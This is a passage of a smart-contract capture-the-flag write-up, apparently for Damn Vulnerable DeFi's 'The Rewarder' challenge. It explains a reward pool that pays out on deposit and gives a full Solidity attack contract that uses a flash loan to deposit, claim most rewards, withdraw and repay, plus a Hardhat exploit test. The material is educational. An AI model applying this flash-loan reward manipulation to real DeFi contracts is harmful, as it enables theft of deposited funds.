@@ -307,3 +307,98 @@ it('Exploit', async function () {
 });
 // ...
 ```
+
+## 5 - The Rewarder
+
+The Rewarder challange stepped up in complexity from previous challanges, it might be intimidating at first. We have 2 pools, **FlashLoanerPool.sol** offering flash loans, **TheRewarderPool.sol** offering reward tokens every 5 days to those who deposit DVT token. The goal is to win majority of rewards.
+
+In order to beat the challenge we must own the majority of deposited reward pool liquidity tokens, and flash loan contract offers loans in.. you guessed it, liquidity tokens!
+
+**AccountingToken.sol** is used inside Reward pool for inside accounting logic to track who deposited what amount etc.
+
+Let's take a look at **TheRewarderPool.sol**'s `deposit` function:
+
+```solidity
+function deposit(uint256 amountToDeposit) external {
+    require(amountToDeposit > 0, "Must deposit tokens");
+
+    accToken.mint(msg.sender, amountToDeposit);
+    distributeRewards();
+
+    require(
+        liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
+    );
+}
+```
+
+As we can see pool distributes rewards each time we deposit liquidity tokens. The condition is though, is must have been 5 days from last time since you can get rewards once per round and each round lasts 5 days.
+
+Finally, we will exploit this `deposit` function with flash loan from **FlashLoanerPool.sol**. We can deposit the loan in **TheRewarderPool.sol** and get most of rewards. Once we receive rewards, we will withdraw tokens and pay back the loan to lender.
+
+To interact with flash loan lender we need smart contract that will orchestrate the above logic.
+
+Solution code:
+
+**TheRewarderAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../the-rewarder/FlashLoanerPool.sol";
+import "../the-rewarder/TheRewarderPool.sol";
+import "../DamnValuableToken.sol";
+
+contract TheRewarderAttack {
+    FlashLoanerPool immutable loanPool;
+    TheRewarderPool immutable rewardPool;
+    DamnValuableToken immutable liqToken;
+    address payable immutable owner;
+
+    constructor(address _loanPool, address _rewardPool, address _liqToken) {
+        loanPool = FlashLoanerPool(_loanPool);
+        rewardPool = TheRewarderPool(_rewardPool);
+        liqToken = DamnValuableToken(_liqToken);
+        owner = payable(msg.sender);
+    }
+
+    function attack(uint256 amount) external {
+        loanPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        liqToken.approve(address(rewardPool), amount);
+
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(amount);
+
+        liqToken.transfer(address(loanPool), amount);
+
+        uint256 balance = rewardPool.rewardToken().balanceOf(address(this));
+        rewardPool.rewardToken().transfer(owner, balance);
+    }
+}
+```
+
+**the-rewarder.challenge.js**
+
+```js
+// ...
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const AttackFactory = await ethers.getContractFactory(
+    'TheRewarderAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(
+    this.flashLoanPool.address,
+    this.rewarderPool.address,
+    this.liquidityToken.address
+  );
+  // wait 5 days for new round
+  await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);
+
+  await attackContract.attack(TOKENS_IN_LENDER_POOL);
+});
+// ...
+```
